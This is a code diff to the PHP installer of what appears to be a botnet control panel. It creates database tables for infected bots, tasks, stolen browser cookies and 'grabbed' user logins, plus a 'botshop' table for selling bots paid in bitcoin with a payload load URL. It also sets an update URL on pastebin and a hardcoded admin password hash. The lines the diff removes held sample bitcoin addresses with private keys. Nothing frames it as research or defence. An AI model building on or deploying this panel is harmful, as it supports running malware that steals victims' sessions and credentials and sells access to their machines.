@@ -48,17 +48,25 @@ class Install{
     */
                $database = "
                     USE ".$mysqldatabaseRand.";
-                    DROP TABLE IF EXISTS config;
-                    DROP TABLE IF EXISTS securitytokens;
                     DROP TABLE IF EXISTS bots;
+                    DROP TABLE IF EXISTS botshop_orders;
+                    DROP TABLE IF EXISTS config;
+                    DROP TABLE IF EXISTS grabbed_cookies;
+                    DROP TABLE IF EXISTS grabbed_users;
+                    DROP TABLE IF EXISTS securitytokens;
                     DROP TABLE IF EXISTS tasks;
                     DROP TABLE IF EXISTS tasks_completed;
                     DROP TABLE IF EXISTS users;
                     
+-- phpMyAdmin SQL Dump
+-- version 4.6.6deb4
+-- https://www.phpmyadmin.net/
+--
 -- Host: localhost:3306
--- Erstellungszeit: 25. Apr 2019 um 17:09
+-- Erstellungszeit: 27. Apr 2019 um 10:53
 -- Server-Version: 10.1.37-MariaDB-0+deb9u1
 -- PHP-Version: 7.0.33-0+deb9u3
+
 
 /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
 /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
@@ -100,6 +108,31 @@ CREATE TABLE `bots` (
   `version` varchar(10) NOT NULL DEFAULT '0.0'
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
+--
+-- Daten für Tabelle `bots`
+--
+
+
+-- --------------------------------------------------------
+
+--
+-- Tabellenstruktur für Tabelle `botshop_orders`
+--
+
+CREATE TABLE `botshop_orders` (
+  `id` int(11) NOT NULL,
+  `type` varchar(255) DEFAULT NULL,
+  `address` varchar(255) DEFAULT NULL,
+  `privatekey` varchar(255) DEFAULT NULL,
+  `botamount` varchar(255) DEFAULT NULL,
+  `loadurl` varchar(255) DEFAULT NULL,
+  `coinstopay` varchar(255) DEFAULT NULL,
+  `usd` varchar(255) DEFAULT NULL,
+  `somesigfromkey` mediumtext,
+  `payed` int(11) NOT NULL DEFAULT '0',
+  `taskid` varchar(255) NOT NULL DEFAULT 'none'
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
 -- --------------------------------------------------------
 
 --
@@ -114,28 +147,25 @@ CREATE TABLE `config` (
   `template` varchar(255) DEFAULT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
-
---
--- Daten für Tabelle `botshop_orders`
---
-
-INSERT INTO `botshop_orders` (`id`, `type`, `address`, `privatekey`, `botamount`, `coinstopay`, `usd`, `somesigfromkey`, `payed`, `taskid`) VALUES
-(1, 'btc', 'mt5UuYv5gbEuTfPcwnFNBXJ1qwV7GDtNui', 'cTueVaUNpKsHncrcgZASDmN9Wk19BmxJzmcw5hgepgGk7cz3ijCU', '50', '0.00190618', '10', NULL, 0, 'none'),
-(2, 'btc', 'miNgvQugw15d9zGGyVpWhWQMpnCdyY7SMp', 'cV74RHsDr6hNkckt3Zh9f7azeGKBGfKjjmU1Korq3ff3gcRA1Bti', '50', '0.00190618', '10', NULL, 0, 'none'),
-(3, 'btc', 'mtohPhWnpZRmeYJMYSCSf3URg85uxr3raw', 'cVY6Em1EAKtjwzyqLzSmdjSFxckEczWRkXTTfoi8aZe54viMVPqi', '50', '0.0019051', '10', NULL, 0, 'none'),
-(4, 'btc', 'miQS7eRB9FUb8FnELwgQdy2zTRhcwvwP9U', 'cPYMUGnoQH3Ca6Hd7s9cRJyfDReX4eWpKdbt1WFwBhRqDbfGuo4m', '50', '0.00190226', '10', NULL, 0, 'none'),
-(5, 'btc', 'mqidkxJMNwVhHTpScpca17kS94wb4Cjhwh', 'cW9KTc8HGzK1CxzWos5gLuBhRXkbaveaDeZBm5uGTJKiU6LrmPeS', '50', '0.00190067', '10', NULL, 0, 'none'),
-(6, 'btc', 'mzLgxiuzYcxC9FqamHHXbMDzENvgmMevLC', 'cVBfxs8vvrvuSTgCPmfiBfcYKK5gyh4FjYZu9ak869j9TzY6JrNx', '50', '0.00190125', '10', NULL, 1, 'none');
-
--- --------------------------------------------------------
-
-
 --
 -- Daten für Tabelle `config`
 --
 
-INSERT INTO `config` (`id`, `enryptionkey`, `check_update_url`, `useragent`) VALUES
-(1, 'KCQ', 'https://pastebin.com/raw/YBGEBviB', 'somesecret');
+INSERT INTO `config` (`id`, `enryptionkey`, `check_update_url`, `useragent`, `template`) VALUES
+(1, 'KCQ', 'https://pastebin.com/raw/YBGEBviB', 'somesecret', 'v1');
+
+-- --------------------------------------------------------
+
+--
+-- Tabellenstruktur für Tabelle `grabbed_cookies`
+--
+
+CREATE TABLE `grabbed_cookies` (
+  `id` int(11) NOT NULL,
+  `site` varchar(255) DEFAULT NULL,
+  `cookiename` varchar(255) DEFAULT NULL,
+  `cookie` varchar(255) DEFAULT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
 -- --------------------------------------------------------
 
@@ -207,7 +237,14 @@ CREATE TABLE `users` (
   `updated_at` timestamp NULL DEFAULT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
 
-              
+--
+-- Daten für Tabelle `users`
+--
+
+--
+-- Indizes der exportierten Tabellen
+--
+
 --
 -- Indizes für die Tabelle `bots`
 --
@@ -215,9 +252,21 @@ ALTER TABLE `bots`
   ADD PRIMARY KEY (`id`);
 
 --
+-- Indizes für die Tabelle `botshop_orders`
+--
+ALTER TABLE `botshop_orders`
+  ADD PRIMARY KEY (`id`);
+
+--
 -- Indizes für die Tabelle `config`
 --
 ALTER TABLE `config`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Indizes für die Tabelle `grabbed_cookies`
+--
+ALTER TABLE `grabbed_cookies`
   ADD PRIMARY KEY (`id`);
 
 --
@@ -255,23 +304,26 @@ ALTER TABLE `users`
 -- AUTO_INCREMENT für exportierte Tabellen
 --
 
-
---
--- Indizes für die Tabelle `botshop_orders`
---
-ALTER TABLE `botshop_orders`
-  ADD PRIMARY KEY (`id`);
-
 --
 -- AUTO_INCREMENT für Tabelle `bots`
 --
 ALTER TABLE `bots`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
+--
+-- AUTO_INCREMENT für Tabelle `botshop_orders`
+--
+ALTER TABLE `botshop_orders`
   MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 --
 -- AUTO_INCREMENT für Tabelle `config`
 --
 ALTER TABLE `config`
   MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
+--
+-- AUTO_INCREMENT für Tabelle `grabbed_cookies`
+--
+ALTER TABLE `grabbed_cookies`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 --
 -- AUTO_INCREMENT für Tabelle `grabbed_users`
 --
@@ -286,7 +338,7 @@ ALTER TABLE `securitytokens`
 -- AUTO_INCREMENT für Tabelle `tasks`
 --
 ALTER TABLE `tasks`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=33;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 --
 -- AUTO_INCREMENT für Tabelle `tasks_completed`
 --
@@ -296,11 +348,10 @@ ALTER TABLE `tasks_completed`
 -- AUTO_INCREMENT für Tabelle `users`
 --
 ALTER TABLE `users`
-  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
+  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
 /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
 /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
-/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;  
-                   
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
                    INSERT INTO users SET username = 'admin', passwort = '".str_replace("%","$",'%2y%10%e031/Nzd4x5LWstBinp7puC2Wil1bRIqm6e/c0eKfD/tLZVwlupyG')."'
                ";
 
